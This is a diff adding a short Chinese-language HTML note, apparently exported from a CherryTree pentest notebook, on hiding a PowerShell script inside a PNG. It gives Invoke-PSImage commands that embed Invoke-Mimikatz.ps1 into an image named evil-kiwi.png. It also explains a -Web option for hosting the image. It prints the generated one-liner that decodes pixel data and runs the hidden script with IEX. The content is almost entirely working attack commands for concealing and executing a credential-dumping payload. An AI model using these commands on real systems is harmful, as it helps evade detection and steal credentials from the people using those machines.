@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>将PS脚本隐藏进PNG执行</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>将PS脚本隐藏进PNG执行</h1><br/>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\2.jpg<br /> -Out ./2.png<br /> <br /> <br /> <br /> Import-Module.\Invoke-PSImage.ps1<br /> Invoke-PSImage-Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png -Web<br /> <br /> -Script[filepath] 需要嵌入在图片中的脚本路径。<br />-Image[filepath] 需要嵌入的图片文件路径。<br />-Out[filepath] 输出文件路径。<br />-Web 输出一条用于读取图片文件的命令，你需要在主机中托管该图片，然后向命令中插入一条URL地址。<br /><br />生成图片后，会返回如下的利用语句<br />原图片需要足够大<br /><br /> <br /> sal a New-Object;Add-Type -AssemblyName &quot;System.Drawing&quot;;$g= a System.Drawing.Bitmap(&quot;E:\downloads\Invoke-PSImage-master\Invoke-PSImage-master\2.png&quot;);$o= a Byte[] 2027520;(0..1055)|% {foreach($x in (0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B -band 15)*16) -bor ($p.G -band 15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..2026761]))<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
